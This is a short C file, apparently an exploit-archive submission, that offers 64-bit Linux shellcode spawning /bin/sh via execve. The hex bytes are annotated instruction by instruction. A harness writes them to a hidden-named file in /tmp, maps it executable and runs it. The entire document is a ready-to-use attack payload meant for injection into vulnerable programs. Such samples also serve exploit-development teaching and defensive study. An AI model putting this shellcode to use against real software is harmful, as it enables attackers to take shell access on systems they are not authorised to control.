/*
execve ("/bin/sh"); exit (0);
shellcode linux 64bits
by m0nad /at/ email.com
*/
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
char shellcode[] = "\x48\xbf\x2f\x2f\x62\x69\x6e"	//mov    $0x68732f6e69622f2f,%rdi
		   "\x2f\x73\x68"			//
		   "\x48\xc1\xef\x08"			//shr    $0x8,%rdi
		   "\x57"				//push   %rdi
		   "\x48\x89\xe7"			//mov    %rsp,%rdi
		   "\x48\x31\xf6"			//xor    %rsi,%rsi
		   "\x48\x31\xd2"			//xor    %rdx,%rdx
		   "\x48\x31\xc0"			//xor    %rax,%rax
		   "\xb0\x3b"				//mov    $0x3b,%al
		   "\x0f\x05"				//syscall
		   "\x48\x31\xff"			//xor    %rdi,%rdi
		   "\x48\x31\xc0"			//xor    %rax,%rax
		   "\xb0\x3c"				//mov    $0x3c,%al
		   "\x0f\x05";				//syscall
int
main(void)
{

  void (*p)();
  int fd;
  printf("Lenght: %d\n", strlen(shellcode));
  fd = open("/tmp/. ", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);
  if (fd < 0)
    err(1, "open");
  write(fd, shellcode, strlen(shellcode));
  if ((lseek(fd, 0L, SEEK_SET)) < 0)
    err(1, "lseek");
  p = (void (*)())mmap(NULL, strlen(shellcode), PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);
  if (p == (void (*)())MAP_FAILED)
    err(1, "mmap");
  p();
  return 0;

}

